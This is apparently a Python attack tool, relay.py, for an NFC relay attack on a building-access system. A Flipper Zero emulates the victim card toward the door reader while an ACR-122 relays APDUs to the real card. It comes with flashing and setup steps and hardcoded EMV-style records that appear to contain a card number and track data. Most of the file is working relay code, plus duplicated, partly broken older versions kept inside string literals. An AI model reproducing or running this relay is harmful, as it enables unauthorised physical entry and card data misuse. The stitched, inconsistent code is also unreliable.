""### relay.py
'''
DISCLAIMER : This program was created for research and educational purposes only with 
    no warranty whatsoever.

Created by TESSIER Solal -- 09-feb-2026

Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
    a legitimate reader and a legitimate access card to grant access to a building
    without the access card being physically close to the reader using
    an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. To run this,
    you will also need to download and compile the libnfc library.
I have forked gvinet's repo to add a few upgrades
    (https://github.com/Panostop/flipperzero-firmware-relay). 


To set up the Flipper :
    - Plug it into the Raspberry Pi
    - run : 
        - git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
        - cd flipperzero-firmware-relay

        # this script can be used each time you need it, it cleans, compiles and flashes the flipper
        - ./flasher
    - wait for the build and installation to finish on the Flipper (can take a while)

The ACR122 is not used twice because of restrictions in emulation mode.

For this program to work, you will need to call it with root privileges because of
    the pyscard module. To do so, because of pyenv shims, call 
    sudo $(which python) relay.py
    to avoid sudo using it's own python environment


This is the physical setup expected :

    [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]


'''























# Copyright (C) 2015-2024 Guillaume VINET
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import time
from pynfcreader.sessions.iso14443.tpdu import Tpdu
from pynfcreader.devices import flipper_zero
from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession
from typing import Tuple
import sys
from smartcard.System import readers


class Reader():

    def __init__(self):
        pass

    def connect(self):
        pass

    def field_off(self):
        pass

    def field_on(self):
        pass

    def process_apdu(self, data: str):
        pass


class PCSCReader(Reader):
    def __init__(self):
        pass

    def connect(self):
        available_readers = readers()

        if len(available_readers) == 0:
            print("No card reader avaible.")
            sys.exit(1)

        # We use the first detected reader
        reader = available_readers[0]
        print(f"Reader detected : {reader}")

        # Se connecter à la carte
        self.connection = reader.createConnection()
        self.connection.connect()

    def process_apdu(self, data: bytes) -> bytes:
        print(f"apdu cmd: {data.hex()}")

        if data.hex() == "00b2010c00":
            resp = bytes.fromhex("70759f6c0200019f650200709f66020e0e9f6b136132770025856368d15062019000990000000f9f670103563442353133323737303032353835363336385e202f5e313530363230313333303030333333303030323232323230303031313131309f62060000003800009f630600000000e0e09f6401039000")
        elif data.hex() == "00b2011400":
            resp = bytes.fromhex(
                "7081a057136132770025856368d15062016583976410000f5a0861327700258563685f24031506305f25031305015f280202505f3401018c219f02069f03069f1a0295055f2a029a039c019f37049f35019f45029f4c089f34038d0c910a8a0295059f37049f4c088e0e00000000000000005e0342031f039f0702ff009f080200029f0d05b0000480009f0e050470a800009f0f05b0000480009f420209789f4a01829000")
        else:
            data, sw1, sw2 = self.connection.transmit(list(data))
            resp = bytes(data + [sw1, sw2])
        print(f"apdu resp: {resp.hex()}")
        return resp


flipper = flipper_zero.FlipperZero("", debug=False)
flipper.connect()
flipper.set_mode_emu_iso14443A()


def process_apdu(cmd: str):
    print(f"apdu {cmd}")
    if cmd == "00a404000e325041592e5359532e444446303100":
        rapdu = "6F57840E325041592E5359532E4444463031A545BF0C42611B4F07A0000000421010500243428701019F2808400200000000000061234F07A0000000041010500A4D4153544552434152448701029F280840002000000000009000"
    else:
        rapdu = "6F00"
    return rapdu


class Emu(Iso14443ASession):
    def __init__(self, cid=0, nad=0, drv=None, block_size=16, process_function=None, reader=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self.process_function = self.process_apdu
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []
        self.reader = reader
        if self.reader:
            self.reader.connect()

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print(tpdu.tpdu)
        print("r block")
        if tpdu.tpdu == b"BA00BED9":
            rtpdu, crc = "BA00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True

        return rtpdu, crc

    def field_off(self):
        print("field off")
        if self.reader:
            self.reader.field_off()

    def field_on(self):
        print("field on")
        if self.reader:
            self.reader.field_on()

    def process_apdu(self, apdu):
        if self.reader:
            return self.reader.process_apdu(apdu)
        else:
            self.process_function(apdu)

    def low_level_dispatcher(self):
        capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            r = self.drv.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {r}")
            if r == "off":
                self.field_off()
            elif r == "on":
                self.field_on()
                ats_sent = False
            else:
                tpdu = Tpdu(bytes.fromhex(r))

                if (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
                    rtpdu, crc = "0A788082022063CBA3A0", True
                    ats_sent = True
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf

                    if tpdu.is_chaining() is False:
                        rapdu = self.process_function(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True

                print(f">>> rtdpu {rtpdu}\n")
                self.drv.emu_send_resp(bytes.fromhex(rtpdu), crc)


pcsc_reader = PCSCReader()

emu = Emu(drv=flipper, reader=pcsc_reader)
emu.run()

































"""
import time
from smartcard.System import readers
from smartcard.CardType import AnyCardType
from smartcard.CardRequest import CardRequest
from smartcard.util import toHexString
from smartcard import PassThruCardService

from pynfcreader.devices import flipper_zero
from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession
from pynfcreader.sessions.iso14443.tpdu import Tpdu
from typing import Tuple
import sys

#we will need a shell to get the card's information
from subprocess import * 
import time


# Initialize and connect to the flipperZero
flipper = flipper_zero.FlipperZero("", debug=False)
flipper.connect()
flipper.set_mode_emu_iso14443A()


class Reader():

    def __init__(self):
        pass

    def connect(self):
        pass

    def field_off(self):
        pass

    def field_on(self):
        pass

    def process_apdu(self, data: str):
        pass

class PCSCReader(Reader):
    def __init__(self, readername: str):
        self.readername = readername
        pass

    def connect(self):
        reader_list=readers() #list pc/sc readers
        CARDTYPE = AnyCardType() #cardtype object for when we will look for the Access Card
        # Display the list of readers
        print("Available PC/SC readers :\n")
        for i in range(len(reader_list)):
            print(f"\t-\t{reader_list[i].name}")
        print("")

        if not len(reader_list) == 1 or not self.readername in reader_list[0].name:
            print(f"Need exactly 1 {self.readername} to continue, {len(reader_list)} readers available.")
            exit(1)

        
        # Se connecter à la carte
        self.connection = reader_list[0].createConnection()
        self.connection.connect()

    def process_apdu(self, data: bytes) -> bytes:
        print(f"apdu cmd: {data.hex()}")

        if data.hex() == "00b2010c00":
            resp = bytes.fromhex("70759f6c0200019f650200709f66020e0e9f6b136132770025856368d15062019000990000000f9f670103563442353133323737303032353835363336385e202f5e313530363230313333303030333333303030323232323230303031313131309f62060000003800009f630600000000e0e09f6401039000")
        elif data.hex() == "00b2011400":
            resp = bytes.fromhex(
                "7081a057136132770025856368d15062016583976410000f5a0861327700258563685f24031506305f25031305015f280202505f3401018c219f02069f03069f1a0295055f2a029a039c019f37049f35019f45029f4c089f34038d0c910a8a0295059f37049f4c088e0e00000000000000005e0342031f039f0702ff009f080200029f0d05b0000480009f0e050470a800009f0f05b0000480009f420209789f4a01829000")
        else:
            data, sw1, sw2 = self.connection.transmit(list(data))
            resp = bytes(data + [sw1, sw2])
        print(f"apdu resp: {resp.hex()}")
        return resp

class Emu(Iso14443ASession): #à retravailler
    def __init__(self, cid=0, nad=0, drv=None, block_size=16, process_function=None, reader=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self.process_function = self.process_apdu
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []
        self.reader = reader
        if self.reader:
            self.reader.connect()

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print("r block")
        if tpdu == "BA00BED9":
            rtpdu, crc = "BA00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True

        return rtpdu, crc

    def field_off(self):
        print("field off")
        if self.reader:
            self.reader.field_off()

    def field_on(self):
        print("field on")
        if self.reader:
            self.reader.field_on()

    def process_apdu(self, apdu):
        if self.reader:
            return self.reader.process_apdu(apdu)
        else:
            self.process_function(apdu)

    def low_level_dispatcher(self):
        capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            r = flipper.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {r}")
            if r == "off":
                self.field_off()
            elif r == "on":
                self.field_on()
                ats_sent = False
            else:
                tpdu = Tpdu(bytes.fromhex(r))

                if (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
                    rtpdu, crc = "0A788082022063CBA3A0", True
                    ats_sent = True
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf

                    if tpdu.is_chaining() is False:
                        rapdu = self.process_function(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True

                print(f">>> rtdpu {rtpdu}\n")
                flipper.emu_send_resp(bytes.fromhex(rtpdu), crc)

def getCardInfo() -> list[str]:
    """
    #Uses the libnfc library to gather UID, ATQA and SAK from the card.
"""
    
    # Used files for better clarity and because of issues with pipes
    with open("CardInfo.txt", "w") as CardInfo:
        
        # returns the full card info
        CardInfo = Popen( ["nfc-list"], 
                        stdout=CardInfo,
                        stderr=PIPE,
                        )
        CardInfo.communicate() #wait for the output, it often takes a bit
    
    with open("CardInfo.txt", "r") as CardInfo:
        CardInfoLines = [line.rstrip() for line in CardInfo] #load the file in a list
        
        # keep only the second half for the lines we need (the actual values after the ': ')
        CardInfoLines = [CardInfoLines[i].split(': ')[1] for i in range(3, 6)]
    
    # ATQA / UID / SAK
    return CardInfoLines

def transfer_apdu(apdu: str, card: PassThruCardService) -> str:
    print(f"apdu {apdu}")
    
    # e.g. "010AFF" --> [0x01, 0x0A, 0xFF] for the transmit method
    #iloveonelinersfromhell

    # 'i' steps 2 characters by 2 through 'apdu'
    # creates a list with each elt being the int conversion of the character n°i and i+1 concatenated
    apdulist = [ int(list(apdu)[i]+list(apdu)[i+1], 16) for i in range(0,len(apdu),2) ]
    card_response, sw1, sw2 = card.transmit(apdulist)
    print(card_response, sw1, sw2)
    return card_response
    
""""""class Emu(Iso14443ASession):
    def __init__(self, cid=0, nad=0, drv=None, block_size=16, process_function=None, reader=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self.process_function = self.process_apdu
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []
        self.reader = reader
        if self.reader:
            self.reader.connect()

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print("r block")
        if tpdu == "BA00BED9":
            rtpdu, crc = "BA00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True

        return rtpdu, crc

    def field_off(self):
        print("field off")
        if self.reader:
            self.reader.field_off()

    def field_on(self):
        print("field on")
        if self.reader:
            self.reader.field_on()

    def process_apdu(self, apdu):
        if self.reader:
            return self.reader.process_apdu(apdu)
        else:
            self.process_function(apdu)

    def low_level_dispatcher(self):
        capdu = bytes()
        ats_sent = False

        iblock_resp_lst = []

        while 1:
            r = self.drv.emu_get_cmd()
            rtpdu = None
            print(f"tpdu < {r}")
            if r == "off":
                print("field off")
            elif r == "on":
                print("field on")
                ats_sent = False
            else:
                tpdu = Tpdu(bytes.fromhex(r))

                if (tpdu.tpdu[0] == 0xE0 or tpdu.tpdu[0] == 0x50) and (ats_sent is False):
                    rtpdu, crc = "0A788082022063CBA3A0", True
                    ats_sent = True
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf

                    if tpdu.is_chaining() is False:
                        rapdu = self.process_function(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True

                print(f">>> rtdpu {rtpdu}\n")
                self.drv.emu_send_resp(bytes.fromhex(rtpdu), crc)
    #take 2
    # inspired by gvinet's example on github.com/gvinet/pynfcreader at 
    # examples/emu_flipper_zero_iso14443_a_relay.py

    def __init__(self, cid=0, nad=0, drv=None, block_size=16, process_function=None, card=None):
        Iso14443ASession.__init__(self, cid, nad, drv, block_size)
        self._addCID = False
        self.drv = self._drv
        self.process_function = process_function
        self._pcb_block_number: int = 1
        # Set to one for an ICC
        self._iblock_pcb_number = 1
        self.iblock_resp_lst = []
        self.card = card
    
    def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
        print("r block")
        if tpdu == "BA00BED9":
            rtpdu, crc = "BA00", True

        elif tpdu.pcb in [0xA2, 0xA3, 0xB2, 0xB3]:
            if len(self.iblock_resp_lst):
                rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
            else:
                rtpdu = self.build_rblock(ack=True).hex()
                crc = True
        
        return rtpdu, crc

    def run(self):
        self.drv.start_emulation()
        print("...go!")
        self.low_level_dispatcher()

    def low_level_dispatcher(self):
        while 1:
            
            received = self.drv.emu_get_cmd()
            rtpdu = None
            print(f"Flipper < {received}")

            if received == "off":
                print("field off")

            elif received == "on":
                print("field on")
                ats_sent = False

            else:
                #real apdu commands
                tpdu = Tpdu(bytes.fromhex(received))

                if (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
                    rtpdu, crc = "0A788082022063CBA3A0", True
                    ats_sent = True
                elif tpdu.r:
                    rtpdu, crc = self.rblock_process(tpdu)
                elif tpdu.s:
                    print("s block")
                    # Deselect
                    if len(tpdu._inf_field) == 0:
                        rtpdu, crc = "C2E0B4", False
                    # Otherwise, it is a WTX

                elif tpdu.i:
                    print("i block")
                    capdu += tpdu.inf

                    if tpdu.is_chaining() is False:
                        rapdu = self.process_function(capdu)
                        capdu = bytes()
                        self.iblock_resp_lst = self.chaining_iblock(data=rapdu)
                        rtpdu, crc = self.iblock_resp_lst.pop(0).hex(), True
                

                print(f">>> rtdpu {rtpdu}\n")
                self.drv.emu_send_resp(rtpdu.encode())
                """
"""
            



def main():
    ACR122 = PCSCReader("ACR122")
    ACR122.connect()
    

    
  
    # Now we want to wait for the presence of a card on the ACR122, 
    #     since we cannot start emulating without it  

    card_info = getCardInfo() # [ATQA, UID, SAK]
    print(f"This card will be emulated :\
          \n\t - ATQA : {card_info[0]}\
          \n\t - UID  : {card_info[1]}\
          \n\t - SAK  : {card_info[2]}")
    
    for i in range(3):
        #joins all the bytes in a continuous string for later
        card_info[i] = "".join(card_info[i].split()) 
    
    flipper.set_atqa(card_info[0])
    flipper.set_uid(card_info[1])
    flipper.set_sak(card_info[2])

    relay = Emu(drv=flipper, process_function=transfer_apdu, reader=ACR122)
    relay.run()


if __name__=='__main__':
    main()"""